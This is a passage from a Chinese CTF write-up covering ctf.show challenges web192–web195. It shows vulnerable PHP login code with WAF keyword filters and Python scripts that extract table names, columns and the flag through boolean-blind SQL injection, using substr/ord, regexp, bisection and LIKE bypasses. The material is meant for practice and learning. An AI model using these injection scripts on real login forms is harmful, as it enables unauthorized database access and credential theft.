</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="c1"># 查数据库</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># 查字段</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># 查flag</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(f1ag) from ctfshow_fl0g&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;admin&#39; and if(ord(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,1,2)=&#39;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;密码错误&#34;</span>  <span class="o">==</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web192">web192<a hidden class="anchor" aria-hidden="true" href="#web192">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//拼接sql语句查找指定ID用户
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//密码检测
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;密码只能为数字&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//密码判断
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:感觉少了个啥，奇怪
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|ascii|ord|hex/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;用户名非法&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>不给我转是吧，那我不转了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://20b20943-6b5a-464b-b13e-99ab8e2644b7.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">flagstr</span><span class="o">=</span><span class="s2">&#34; _</span><span class="si">{}</span><span class="s2">-&#34;</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">45</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">flagstr</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;admin&#39; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1)regexp(&#39;</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">&#39;),1,2)=&#39;1&#34;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;密码错误&#34;</span> <span class="o">==</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="k">if</span> <span class="s2">&#34;}&#34;</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">break</span>
</span></span></code></pre></div><p>其实也差不多</p>
<p>二分法脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"># 用了二分法 dejavu~~~</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://c9b03201-bcdf-42ce-ac5b-c546603c1848.challenge.ctf.show:8080/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="c1"># 表名 CtFsHOw{FL0G,CtFsHOw{usEr</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1"># payload = &#34;0&#39; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)&gt;&#39;{}&#39;,1,0) -- &#34;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1"># 列名 ID,F1AG,ID,usErNAME,pAss</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"># payload = &#34;0&#39; or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),{},1)&gt;&#39;{}&#39;,1,0) -- &#34;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"># flag</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;0&#39; or if(substr((select f1ag from ctfshow_fl0g),</span><span class="si">{}</span><span class="s2">,1)&gt;&#39;</span><span class="si">{}</span><span class="s2">&#39;,1,0) -- &#34;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">true_flag</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">u5bc6</span><span class="se">\\</span><span class="s2">u7801</span><span class="se">\\</span><span class="s2">u9519</span><span class="se">\\</span><span class="s2">u8bef&#34;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">index</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="n">start</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="n">end</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">while</span> <span class="ow">not</span> <span class="p">(</span><span class="nb">abs</span><span class="p">(</span><span class="n">start</span><span class="o">-</span><span class="n">end</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">or</span> <span class="n">start</span> <span class="o">==</span> <span class="n">end</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="n">start</span> <span class="o">+</span> <span class="n">end</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">p</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">                <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">if</span> <span class="n">true_flag</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="n">start</span> <span class="o">=</span> <span class="n">p</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="n">end</span> <span class="o">=</span> <span class="n">p</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">if</span> <span class="n">end</span> <span class="o">&lt;</span> <span class="n">start</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="n">end</span> <span class="o">=</span> <span class="n">start</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">end</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] result: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span></code></pre></div><h4 id="web193">web193<a hidden class="anchor" aria-hidden="true" href="#web193">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//拼接sql语句查找指定ID用户
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//密码检测
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;密码只能为数字&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//密码判断
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:感觉少了个啥，奇怪
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|ascii|ord|hex|substr/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;用户名非法&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p><strong>新增waf</strong>：substr</p>
<p>没办法进行截断，但其实问题不大</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://a4ac8172-cadd-42ca-a986-771b4ab0400f.challenge.ctf.show/api/&#39;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">letter</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyz-_,</span><span class="si">{}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">letter</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="c1"># 查表</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="c1"># 查字段</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&#34;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="c1"># 查flag</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(f1ag) from ctfshow_flxg&#34;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="s2">&#34;admin&#39; and if((</span><span class="si">{}</span><span class="s2">) like &#39;</span><span class="si">{}</span><span class="s2">%&#39;,1,2) =&#39;1&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="n">result</span><span class="o">+</span><span class="n">j</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="mi">1</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;密码错误&#34;</span> <span class="o">==</span> <span class="n">res</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="n">result</span> <span class="o">+=</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;}&#34;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></div><p>我们可以用like来达到差不多的效果</p>
<p>这题也可以用char,left,right,substring之类的方法</p>
<h4 id="web194">web194<a hidden class="anchor" aria-hidden="true" href="#web194">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//拼接sql语句查找指定ID用户
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//密码检测
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;密码只能为数字&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//密码判断
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:感觉少了个啥，奇怪
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|ascii|ord|hex|substr|char|left|right|substring/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;用户名非法&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p><strong>新增waf</strong>：char|left|right|substring</p>
<p>上题的方法依旧适用</p>
<h4 id="web195">web195<a hidden class="anchor" aria-hidden="true" href="#web195">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//拼接sql语句查找指定ID用户
